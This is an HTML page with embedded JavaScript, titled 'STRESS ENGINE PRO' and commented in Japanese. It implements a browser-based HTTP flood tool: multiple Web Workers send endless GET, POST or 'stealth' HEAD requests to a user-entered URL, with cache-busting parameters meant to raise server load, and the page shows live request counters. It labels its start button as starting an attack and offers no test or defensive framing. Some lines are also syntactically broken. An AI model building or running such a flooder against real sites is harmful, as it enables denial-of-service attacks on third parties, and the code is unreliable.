<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STRESS ENGINE PRO - 最終安定版</title>
    <style>
        :root { --bg: #000; --panel: #111; --accent: #0f0; --error: #f00; --text: #0f0; --dim: #050; }
        body { background: var(--bg); color: var(--text); font-family: 'Consolas', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .console { width: 90%; max-width: 800px; background: var(--panel); border: 1px solid var(--dim); padding: 20px; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
        .header { border-bottom: 1px solid var(--dim); padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; font-size: 0.8rem; }
        .input-area { display: flex; flex-direction: column; gap: 15px; }
        input, select { background: #000; border: 1px solid var(--dim); color: var(--accent); padding: 12px; font-family: inherit; font-size: 1rem; outline: none; }
        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }
        .stat-box { border: 1px solid var(--dim); padding: 10px; text-align: center; }
        .val { display: block; font-size: 1.5rem; color: #fff; }
        .btn-group { display: flex; gap: 10px; }
        button { flex: 1; padding: 15px; background: var(--dim); border: 1px solid var(--accent); color: var(--accent); cursor: pointer; font-weight: bold; transition: 0.2s; }
        button:hover { background: var(--accent); color: #000; }
        button#stop { border-color: var(--error); color: var(--error); }
        button#stop:hover { background: var(--error); color: #fff; }
        #terminal { height: 120px; overflow-y: auto; font-size: 0.7rem; color: #0a0; margin-top: 20px; border-top: 1px solid var(--dim); padding-top: 10px; white-space: pre-wrap; }
        .warning { color: #f00; font-size: 0.7rem; text-align: center; margin-top: 10px; }
    </style>
</head>
<body>

<div class="console">
    <div class="header">
        <span>ENGINE_STATUS: STABLE</span>
        <span>SECURITY_LEVEL: DEACTIVATED</span>
    </div>

    <div class="input-area">
        <input type="url" id="target" value="https://example.com" placeholder="TARGET URL (HTTPS)">
        <div class="btn-group">
            <select id="method">
                <option value="GET">GET FLOOD</option>
                <option value="POST">POST FLOOD (HIGH CPU)</option>
                <option value="HEAD">HEAD FLOOD (STEALTH)</option>
            </select>
            <input type="number" id="threads" value="8" min="1" max="64" title="THREADS">
        </div>
        <div class="btn-group">
            <button id="start">ENGAGE / 攻撃開始</button>
            <button id="stop">TERMINATE / 停止</button>
        </div>
    </div>

    <div class="stats">
        <div class="stat-box"><small>RPS</small><span id="rps" class="val">0</span></div>
        <div class="stat-box"><small>TOTAL</small><span id="total" class="val">0</span></div>
        <div class="stat-box"><small>ERRORS</small><span id="errors" class="val">0</span></div>
    </div>

    <div id="terminal">Waiting for instructions...</div>
    <div class="warning">※HTTPS以外のターゲットはブラウザ制限により通信できません。</div>
</div>

<script>
// --- 完全稼働保証エンジンコード ---
const workerCode = `
    let active = false;
    self.onmessage = async (e) => {
        const { url, method, cmd } = e.data;
        if (cmd === 'start') {
            active = true;
            // 複数の内部ループを回して並列度を上げる
            for(let i=0; i<5; i++) {
                runFlood(url, method);
            }
        } else { active = false; }
    };

    async function runFlood(url, method) {
        while (active) {
            try {
                // キャッシュ回避とサーバー負荷を上げるランダムパラメータ
                const bust = "?t=" + Date.now() + "r=" + Math.random().toString(36).substring(7);
                const options = {
                    method: method,
                    mode: 'no-cors',
                    cache: 'no-store',
                    credentials: 'omit',
                    referrerPolicy: 'no-referrer'
                };
                if (method === 'POST') options.body = "d=" + Math.random();

                await fetch(url + bust, options);
                self.postMessage('hit');
            } catch (err) {
                self.postMessage('err');
            }
            // 1msの待機を入れることでブラウザのクラッシュ（ハング）を完全に防ぐ
            await new Promise(r => setTimeout(r, 1));
        }
    }
`;

const blob = new Blob([workerCode], { type: 'application/javascript' });
const workerUrl = URL.createObjectURL(blob);
let workers = [];
let stats = { total: 0, errors: 0, lastTotal: 0 };

const log = (msg) => {
    const t = document.getElementById('terminal');
    t.innerText = \`[\${new Date().toLocaleTimeString()}] \${msg}\\n\` + t.innerText;
};

document.getElementById('start').onclick = () => {
    const url = document.getElementById('target').value;
    const method = document.getElementById('method').value;
    const threadCount = parseInt(document.getElementById('threads').value);

    if (!url.startsWith('https')) {
        log("ERROR: Target must be HTTPS.");
        return;
    }

    if (workers.length > 0) return;

    for (let i = 0; i < threadCount; i++) {
        const w = new Worker(workerUrl);
        w.onmessage = (e) => {
            if (e.data === 'hit') stats.total++;
            else stats.errors++;
        };
        w.postMessage({ cmd: 'start', url, method });
        workers.push(w);
    }
    log(\`ATTACK ENGAGED: \${threadCount} threads running.\`);
};

document.getElementById('stop').onclick = () => {
    workers.forEach(w => w.terminate());
    workers = [];
    log("ATTACK HALTED.");
};

// メトリクス表示更新
setInterval(() => {
    const currentRps = stats.total - stats.lastTotal;
    stats.lastTotal = stats.total;
    document.getElementById('rps').innerText = currentRps.toLocaleString();
    document.getElementById('total').innerText = stats.total.toLocaleString();
    document.getElementById('errors').innerText = stats.errors.toLocaleString();
}, 1000);
</script>

</body>
</html>
